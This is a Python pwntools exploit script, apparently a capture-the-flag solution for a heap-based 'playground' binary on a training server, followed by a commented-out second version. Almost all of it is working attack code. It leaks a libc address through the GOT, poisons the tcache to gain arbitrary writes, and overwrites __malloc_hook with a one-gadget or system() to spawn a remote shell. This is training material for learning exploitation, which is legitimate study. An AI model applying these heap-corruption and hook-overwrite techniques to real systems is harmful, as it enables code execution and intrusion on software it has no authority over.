from pwn import *

r = remote("bin.training.offdef.it", 4110)
# r = process("./playground")

# r = gdb.debug("./playground", '''
# set glibc ./libc-2.27.so
# set resolve-heap-via-heuristic on
# #b *0x5555555551d9
# #b *0x555555555349
# #b *0x555555555551
# #b *0x555555555556
# #b *0x5555555553a0
# b *0x555555555511
# # ''')
#main
#malloc
#before write
#write
#free
#write fail

def malloc(size):
    sleep(0.5)
    r.sendline(b"malloc " + size)
    return r.recvuntil(b"\n>")[-14:-2]

def free(addr):
    sleep(0.5)
    r.sendline(b"free " + addr)
    r.recvuntil(b"==> ok")

def show(addr, size):
    sleep(0.5)
    r.sendline(b"show " + addr + b" " + size)
    return r.recvuntil(b">")

def write(addr, size, cont):
    sleep(0.5)
    r.sendline(b"write " + addr + b" " + size)
    r.recvuntil(b"==> read")
    r.sendline(cont)
    r.recvuntil(b"==> done\n")

#just for debug. Basically we can set a checkpoint on a line which is executed only when this function is called
def writeFail():
    sleep(0.5)
    r.sendline(b"write 0x7888888888888898 1")
    r.recvuntil(b"==> fail")



input("Press enter to start")

mainOffset = int(r.recvuntil(">")[-14:-2], 16) - 0x001011d9 #dynamic - static = offset
minheapAddr = mainOffset + 0x1040a8
setvbufGot = 0x00104060 + mainOffset
setvbufInLibc = int(show(hex(setvbufGot).encode(), b"1")[-14:-2], 16)
print("leak of setvbuf: " + hex(setvbufInLibc))
libc = setvbufInLibc - 0x813d0 #setvbuf - libc = 0x813d0 (obtained by an inspection of a run with GDB by using vmmap to get the start of libc)
mallocHook = libc + 0x3ebc30 #mallocHook - libc = 0x3ebc30 (obtained via GDB: p &__malloc_hook
oneGadget = libc + 0xe561e
print("one gadget: " + hex(oneGadget))

print("setting the min_heap to zero in order to avoid restrictions on where to write...")
chunk1 = int(malloc(b"8"), 16) #allocate first
chunk2 = int(malloc(b"8"), 16) #allocate second
avoidCoalescing = int(malloc(b"8"), 16) #this chunks avoid coalescing after the 2 frees

free(hex(chunk1).encode()) #free the first (we need at least 2 chunks in the tcache for the poisoning for some reason)
free(hex(chunk2).encode()) #free the second

write(hex(chunk2).encode(), b"16", p64(minheapAddr-0x8)) #overwrite the fwd pointer of the second

malloc(b"8") #in the root of the tcache now there is minheapAddr - 0x8 (because we overwritten the fwd pointer of the second)
chunkOnMaxHeap = int(malloc(b"8"), 16) #after this alloc minheapAddr is set to 0, because of how the libc works (see slide 82)

print("overwriting the max_heap...")
write(hex(chunkOnMaxHeap).encode(), b"16", p64(0x7888888888888888)) #we set it to this value because we want to be able to call writeFail to have checkpoints "on demand"

print("creating chunk on the malloc hook...")
chunk3 = int(malloc(b"32"), 16) #allocate first
chunk4 = int(malloc(b"32"), 16) #allocate second
avoidCoalescing2 = int(malloc(b"32"), 16) #this chunks avoid coalescing after the 2 frees

free(hex(chunk3).encode()) #free the first (we need at least 2 chunks in the tcache for the poisoning for some reason)
free(hex(chunk4).encode()) #free the second

write(hex(chunk4).encode(), b"16", p64(mallocHook)) #overwrite the fwd pointer of the second

malloc(b"32") #in the root of the tcache now there is mallocHook (because we overwritten the fwd pointer of the second)
mallocHookChunk = int(malloc(b"32"), 16) #this chunk is on the malloc hook

write(hex(mallocHookChunk).encode(), b"16", p64(oneGadget)) #now the malloc hook points to the one gadget

writeFail() #this is used just to debug. Basically we can set a checkpoint on a line which is executed only when this function is called

malloc(b"64") #this malloc triggers the one gadget

r.interactive()


""" from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./playground")
    gdb.attach(r, """
    # b 
    #c
""")
    input("wait")
else:
    r = remote("bin.training.offdef.it", 4110)

def malloc(n):
	r.recvuntil('> ')
	r.sendline('malloc ' + str(n))
	r.recvuntil('==> ')
	return int(r.recvuntil(b'\n'), 0)

def free(p):
	r.recvuntil('> ')
	r.sendline('free ' + hex(p))
	r.recvuntil('==> ok')

def show(p, n=1, v=False):
	r.recvuntil('> ')
	r.sendline('show ' + hex(p) + ' ' + str(n))
	d = {}
	for i in range(n):
		pointer = int(r.recvuntil(b':')[:-1], 0)
		content = r.recvuntil(b'\n').strip(' ')
		#print('P = ' + str(pointer) + '; C = ' + content + ' len=' + str(len(content)))
		c = 0
		if len(content) != 1:
			c = int(content, 0)
		d[pointer] = c

	if v:
		for k in d:
			print(hex(k) + ': ' + hex(d[k]))

	return d

def write(p, content):
	r.recvuntil('> ')
	r.sendline('write ' + hex(p) + ' ' + str(len(content)))
	r.recvuntil(b'==> read\n')
	r.send(content)
	r.recvuntil(b'==> done\n')
	
libc = ELF('./libc-2.27.so')

# Addresses and PID
r.recvuntil(b'pid: ')
pid = int(r.recvuntil(b'\n'))
r.recvuntil(b'main: ')
main = int(r.recvuntil(b'\n'), 0)

print('[!]pid = {}\n[!]main = {}'.format(pid, hex(main)))

a = malloc(0x410)
b = malloc(500) # discard

free(a)

target = main + 0x2ec7
print("[!]target: {}".format(hex(target)))
# write to max_heap location (target)
write(a + 8, p64(target - 0x10))

c = malloc(0x410) # discard

print("[!] now max_heap should be different!")

libc_leak = show(target, n=1, v=False)[target]

print("[!] leak: {}".format(hex(libc_leak)))

malloc_hook_location = libc_leak - 0x70
libc.address = malloc_hook_location - 0x3ebc30

bin_sh = next(libc.search(b'/bin/sh\0'))

print("[!] bin_sh: {}".format(hex(bin_sh)))

#write(c, p64(0xdeadbeef) + p64(bin_sh))
write(malloc_hook_location, p64(libc.symbols['system']))

r.recvuntil('> ')
r.sendline('malloc ' + str(bin_sh))

r.interactive()
 """